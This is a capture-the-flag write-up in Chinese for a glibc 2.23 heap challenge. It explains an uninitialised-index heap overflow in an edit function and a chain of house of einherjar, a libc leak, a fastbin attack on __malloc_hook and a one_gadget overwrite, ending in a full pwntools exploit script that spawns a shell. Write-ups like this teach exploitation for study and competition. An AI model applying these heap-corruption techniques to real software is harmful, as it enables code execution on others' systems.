# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: on
  - NX: on
  - RELRO: Full RELRO
  - Canary: on
  - Fortify: Enabled

# 漏洞成因
## 程序关键数据结构
程序使用两个全局数组来管理堆块：
- `chunk[50]`: 存储通过`malloc`申请的堆块指针。
- `size[50]`: 存储对应索引所申请堆块的大小（用户请求的size，非chunk的size字段）。

## 漏洞定位
`edit`函数存在堆溢出漏洞。该函数在写入数据时，使用的size来源于全局数组`size`中索引为`v1`的值（`v2 = size[v1];`），而`v1`是用户本次输入的要编辑的book ID。这意味着，如果上一次操作（如`add`或`delete`）的book ID与本次`edit`的ID不同，`edit`将使用错误（上一次操作）的size向目标堆块写入数据，可能导致溢出。
```c
int edit()
{
  int v1; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+4h] [rbp-Ch] // v2 = size[v1]; 此处v1未初始化，是上一次操作留下的值
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = size[v1]; // 关键漏洞：使用“上一次操作”的索引v1对应的size
  printf("Which book to write?");
  __isoc99_scanf(&unk_10C8, &v1); // 用户输入本次要编辑的ID，覆盖v1
  if ( chunk[v1] )
  {
    printf("Content: ");
    read(0, (void *)chunk[v1], (unsigned int)(v2 + 1)); // 使用错误的size进行读写，可能造成堆溢出
    return puts("Done!\n");
  }
...
}
```
此外，`show`函数存在数组越界读漏洞，但本利用链中未使用。

# 漏洞利用过程：
本利用结合了`house of einherjar`和`fastbin attack`。核心思路如下：
1.  利用堆溢出泄露堆地址，为后续伪造堆块做准备。
2.  利用`house of einherjar`技术，通过堆溢出伪造一个空闲堆块，释放其相邻高地址块触发后向合并，将多个堆块合并放入`unsorted bin`，同时使得一个仍被指针引用的堆块（ID 2）处于合并后的`unsorted bin`内部。
3.  从`unsorted bin`分割一块后，利用`show`功能泄露`main_arena`地址，从而计算`libc`基址。
4.  利用残存的指针（ID 2）进行`fastbin attack`，将`__malloc_hook`附近区域伪造成一个`fast chunk`。
5.  分配到此伪造`chunk`后，修改`__malloc_hook`为`one_gadget`地址，最终触发`malloc`以获取`shell`。

## Step 1: 堆布局与地址泄露准备
- 申请堆块 ID 6 (0x10), ID 7 (0x20), ID 8 (0x20), ID 9 (0x40)。其中ID 9用于防止后续释放的堆块与`top chunk`合并。
- 释放 ID 8，再释放 ID 7。此时 ID 7 进入 `fastbin`，其`fd`指针指向 ID 8 堆块的`prev_size`地址（即 ID 8 的起始地址 - 0x10）。
- 堆内存`0x632561334020`（ID 7 chunk）处，`fd`指针从`0x0`变为`0x632561334050`（ID 8 的`prev_size`地址）。变化的原因是`free`操作将 ID 7 链入`fastbin`，其`fd`指向下一个空闲块（ID 8）的地址。

## Step 2: 泄露堆基址
- 向 ID 6 写入 `0x1f` 个 `'a'`，利用`edit`的堆溢出覆盖 ID 7 堆块的用户数据区末尾。
- 调用`show(6)`，由于 ID 6 和 ID 7 在内存中相邻，输出会连带打印出 ID 7 堆块用户数据区的内容，其中包含了其`fd`指针的值。
- 解析输出，得到`fd`指针值（即 ID 8 的`prev_size`地址），减去固定偏移后即可计算出堆的起始地址(`chunk_addr`)。此地址用于后续计算伪造堆块的确切位置。

## Step 3: House of Einherjar 布局
- 申请堆块 ID 0 (0x10), ID 1 (0xf8), ID 2 (0x10), ID 3 (0xf8), ID 4 (0x40)。ID 0和ID 2是用于溢出的“小堆块”，ID 1和ID 3是即将被合并的“大堆块”，ID 4用于确保`edit` ID 0时使用ID 4的size (0x40)进行写入，从而能覆盖到ID 1的头部。
- 计算 ID 1 和 ID 3 的堆块地址 (`chunk1_addr`, `chunk3_addr`)。

## Step 4: 伪造空闲堆块 (ID 3)
- 通过`edit(2)`，利用 ID 2 溢出到 ID 3，设置 ID 3 的 `prev_size` 为 `0x120`（即 ID 1 + ID 2 的总大小），并将 ID 3 的 `size` 的 `PREV_INUSE` 位清零，标记其前一个堆块（即将伪造的堆块）为空闲。
- 堆内存 ID 3 的头部，`prev_size`字段被设置为`0x120`，`size`字段从`0x101`（含标志位）修改为`0x100`（清除了`PREV_INUSE`位）。

## Step 5: 伪造前一个空闲堆块 (ID 1)
- 申请 ID 5 (0x40)。这使得下一次`edit` ID 0时，使用的size是ID 5的size (0x40)，足以覆盖ID 1头部。
- 通过`edit(0)`，利用 ID 0 溢出到 ID 1，伪造 ID 1 为一个空闲块：
    - 设置 `size` 为 `0x121`（包含`PREV_INUSE`位，因为其物理前一个堆块ID 0在使用中）。
    - 设置 `fd` 和 `bk` 都为 `chunk1_addr`（指向自身），以满足`unlink`检查：`P->fd->bk == P` 且 `P->bk->fd == P`。
- 堆内存 ID 1 的头部，`size`字段从`0x101`变为`0x121`，`fd`和`bk`指针被设置为`chunk1_addr`。

## Step 6: 触发合并与泄露Libc地址
- `free(3)`。由于 ID 3 的 `prev_inuse` 为 0，`glibc`会尝试向后合并。
    - 检查 `prev_size` (0x120) 定位到伪造的空闲块 ID 1。
    - 对 ID 1 执行 `unlink` 操作。因为其 `fd` 和 `bk` 都指向自身，通过检查。
    - 将 ID 1, ID 2, ID 3 三个物理相邻的堆块合并为一个大的空闲块，放入 `unsorted bin`。此时`unsorted bin`中的这个空闲块的`fd`和`bk`指向`main_arena`中的管理结构。
- **关键**：ID 2 的指针 `chunk[2]` 仍然指向合并后大块内部的某个位置（原ID 2用户区）。
- `create(1, 0xf8)`。从刚合并的`unsorted bin`大块中分割出 `0x100` 大小（实际chunk大小）的块分配给 ID 1。分割后，剩余的`unsorted bin`块的`fd`和`bk`指针恰好位于原 ID 2 用户数据区的前16字节。
- `show(2)`。输出原 ID 2 用户区的内容，前8字节即 `bk` 指针，指向 `main_arena+88`，由此泄露`libc`地址。

## Step 7: Fastbin Attack 劫持 __malloc_hook
- `create(10, 0x68)` 然后 `free(10)`。这将一个 `size` 为 `0x70` 的 chunk 放入 `fastbin`。注意，此时 `chunk[10]` 和 `chunk[2]` 指向**同一个地址**（因为 ID 2 从未被释放，而 ID 10 申请时复用了 ID 2 所在的空闲空间）。
- 计算 `fake_chunk` 地址为目标 `__malloc_hook - 0x23`，该处可以构造出 `size` 为 `0x7f` 的字段，以通过 `fastbin` `size` 检查。
- `edit(2, p64(fake_chunk))`。通过残存的 ID 2 指针，修改 `fastbin` 中 ID 10 对应 chunk 的 `fd` 指针，使其指向 `fake_chunk`。
- 连续两次 `create` (ID 11, ID 13)，大小均为 `0x68`。第一次分配取出原 `fastbin` 中的 chunk，第二次分配即可从被篡改的链表中取出 `fake_chunk`，从而获得 `__malloc_hook` 附近的写权限。

## Step 8: 写入OneGadget并触发
- 计算 `one_gadget` 地址。为了满足其约束条件，选择将 `__malloc_hook` 覆盖为 `realloc` 函数开头某条指令的地址（如 `realloc+16`），以调整栈帧；将 `__realloc_hook` 覆盖为 `one_gadget` 地址。
- `edit(13, b'a'*3 + p64(0) + p64(ogg) + p64(realloc_hook+16))`。向 `fake_chunk` 写入数据，精心构造 payload 以正确覆盖 `__realloc_hook` 和 `__malloc_hook`。
- `create(14, 20)`。触发一次 `malloc` 调用，其内部会调用 `__malloc_hook`，进而跳转到 `realloc`，再根据 `__realloc_hook` 跳转到 `one_gadget`，最终获得 shell。

# Exploit：
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

# p = process('./pwn')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # 根据题目环境替换

def create(ID, size):
    p.sendlineafter(b'choice: ', b'1')
    p.sendlineafter(b'ID: ', str(ID).encode())
    p.sendlineafter(b'long: ', str(size).encode())

def show(ID):
    p.sendlineafter(b'choice: ', b'2')
    p.sendlineafter(b'show?', str(ID).encode())

def delete(ID):
    p.sendlineafter(b'choice: ', b'3')
    p.sendlineafter(b'throw?\n', str(ID).encode())

def edit(ID, content):
    p.sendlineafter(b'choice: ', b'4')
    p.sendlineafter(b'write?', str(ID).encode())
    p.sendafter(b'Content: ', content)

# Step 1 & 2: 泄露堆地址
create(6, 0x10)
create(7, 0x20)
create(8, 0x20)
create(9, 0x40) # 防止与top合并
delete(8)
delete(7) # ID7进入fastbin，其fd指向ID8的prev_size地址

payload = b'a' * 0x1f # 填充ID6并溢出到ID7用户区末尾
edit(6, payload)
show(6)
p.recvuntil(b'to show?Content:')
p.recvline() # 接收换行符
chunk_addr = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x50 # 解析出ID8的prev_size地址，计算堆基址
log.success("heap base: " + hex(chunk_addr))

# Step 3 & 4 & 5: House of Einherjar 布局与伪造
create(0, 0x10)
create(1, 0xf8)
create(2, 0x10)
create(3, 0xf8)
create(4, 0x40) # 使下次edit(0)使用size=0x40

chunk1_addr = chunk_addr + 0x20 + 0x30 + 0x30 + 0x50 + 0x20 # 计算ID1的chunk地址
chunk3_addr = chunk1_addr + 0x120 # 计算ID3的chunk地址 (ID1+ID2 size)

# 伪造ID3，使其认为前一个块是空闲的
payload = b'a'*0x10 + p64(0x120) + p64(0x100) # prev_size = ID1+ID2大小, size (清除PREV_INUSE位)
edit(2, payload)

create(5, 0x40) # 使下次edit(0)使用size=0x40，足以覆盖ID1头部
# 伪造ID1为一个空闲块，其fd/bk指向自身以绕过unlink检查
payload = b'a'*0x10 + p64(0) + p64(0x121) + p64(chunk1_addr) + p64(chunk1_addr)
edit(0, payload)

# Step 6: 触发后向合并并泄露libc
delete(3) # 触发house of einherjar，ID1/ID2/ID3合并进入unsorted bin
create(1, 0xf8) # 从unsorted bin分割，使fd/bk指针落入原ID2用户区
show(2)
p.recvuntil(b'to show?Content: ')
main_arena = u64(p.recvline()[:-1].ljust(8, b'\x00')) # 泄露unsorted bin的bk，即main_arena+88
log.success("main_arena+88: " + hex(main_arena))

libc_base = main_arena - 88 - 0x10 - libc.sym['__malloc_hook'] # 计算libc基址
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc_hook = libc_base + libc.sym['realloc']
one_gadget = libc_base + 0x4526a # 选择合适one_gadget
fake_chunk = malloc_hook - 0x23 # 伪造fast chunk的目标地址
log.success("libc base: " + hex(libc_base))
log.success("fake_chunk: " + hex(fake_chunk))

# Step 7: Fastbin Attack
create(10, 0x68) # 申请一个fast chunk (size=0x70)
delete(10) # 放入fastbin，此时chunk[2]和chunk[10]指向同一地址
edit(2, p64(fake_chunk)) # 通过UAF修改fastbin中chunk的fd指针
create(11, 0x68) # 取出原fastbin chunk
create(13, 0x68) # 取出伪造的fake_chunk，获得__malloc_hook附近写权限

# Step 8: 覆盖hook并触发
# 修改__realloc_hook为one_gadget，__malloc_hook为realloc+16以调整栈帧满足约束
payload = b'a'*3 + p64(0) + p64(one_gadget) + p64(realloc_hook + 16)
edit(13, payload)
# 触发malloc，进而调用hook获得shell
create(14, 20)

p.interactive()
```